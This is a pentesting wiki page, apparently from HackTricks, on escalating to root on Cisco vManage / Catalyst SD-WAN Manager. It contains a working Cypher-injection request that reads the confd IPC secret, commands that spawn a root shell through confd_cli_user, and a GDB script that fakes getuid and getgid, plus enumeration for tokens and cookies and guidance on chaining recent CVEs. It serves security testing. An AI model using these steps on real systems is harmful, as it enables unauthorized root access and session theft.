# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Once you have code execution on Cisco vManage / *Catalyst SD-WAN Manager* as `vmanage`, `netadmin`, or `vmanage-admin`, the most interesting local privesc surfaces are usually the `confd` CLI stack, the `cmdptywrapper` helper, localhost REST APIs, and root-owned import/upload handlers.

If you still need the **initial foothold** on a controller, check the dedicated control-plane page first:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage

```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```

If `/etc/confd/confd_ipc_secret` is readable from your foothold, Path 1 and Path 2 become immediately practical.

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:

```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```

Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:

```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```

The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:

```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```

## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.

When I disassembled `/usr/bin/confd_cli` binary, I observed the following:

<details>
<summary>Objdump showing UID/GID collection</summary>

```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```

</details>

When I run “ps aux”, I observed the following (_note -g 100 -u 107_)

```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```

I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.

My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.

As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.

I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.

root.gdb:

```
set environment USER=root
define root
   finish
   set $rax=0
   continue
end
break getuid
commands
   root
end
break getgid
commands
   root
end
run
```

Console Output:

<details>
<summary>Console output</summary>

```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```

</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco later documented a cleaner local root path in its own advisory for [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): an **authenticated attacker with only read-only privileges** could send a crafted request to the manager CLI and jump to root because of insufficient input validation.

From an offensive perspective, this is the important takeaway:

1. Once you have *any* low-priv foothold on the box, you should test the local CLI service before going for the heavier Path 1 / Path 2 workflow.
2. Reuse the artifacts from Path 2 to find the trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Treat every field forwarded to the CLI backend as suspicious: UID/GID, username, terminal metadata, imported files, or any value later consumed by a root-owned helper.
4. If a low-priv user can reach the local CLI socket and influence those fields, root may be only one crafted request away.

A practical workflow after landing on the appliance is:

```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```

This turns the 2025 bug into a good hunting pattern for similar versions: look for **local CLI shims that collect identity in userland and forward it to a more privileged wrapper**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco's February 2026 advisory also introduced another useful privesc class: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) allowed an **authenticated, local attacker with low privileges** to gain root because of an insufficient user-authentication mechanism in the REST API.

This matters because vManage privesc is not limited to `confd`/TTY abuse anymore. After a low-priv shell, also hunt for:

- localhost-only API endpoints that trust the caller too much
- tokens, cookies, or service credentials readable from the current account
- root-only actions exposed through `dataservice`/REST handlers that can still be triggered locally

In practice, once you have a shell as `vmanage` or another service user, local API abuse is often quieter and easier to automate than interactive CLI abuse:

```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```

If the local session context is enough to hit privileged REST functionality, prefer the API path: it is easier to replay, script, and chain with stolen web sessions or API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Another recent pattern is [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): a local attacker with `netadmin` privileges could upload a **crafted file** that the CLI later handled unsafely, leading to command injection as `root`.

From a HackTricks point of view, the valuable technique is broader than the specific CVE:

1. Enumerate every CLI or web workflow that accepts a file: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Trace where the uploaded file lands and which root-owned script or binary consumes it.
3. Test whether the filename, file content, or parsed metadata is ever passed to shell commands, wrapper scripts, or `system()`-style helpers.
4. If you can already reach `netadmin` (valid creds, stolen session, or an auth-bypass chain), file-processing bugs are often the fastest path to root.

This bug class chains especially well with remote footholds that grant `netadmin` but not `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – Steal an admin session in the web UI, then pivot into API/CLI actions that eventually reach `vshell` or one of the local privesc paths above.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Very strong precursor for Path 5 because `netadmin` is exactly the level required by the 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Useful for dropping files that later get parsed by privileged components or for overwriting operational artifacts consumed by root-owned helpers.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Better documented in the dedicated SD-WAN control-plane page; it can append an SSH key for `vmanage-admin`, giving you the local foothold needed to revisit this page.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
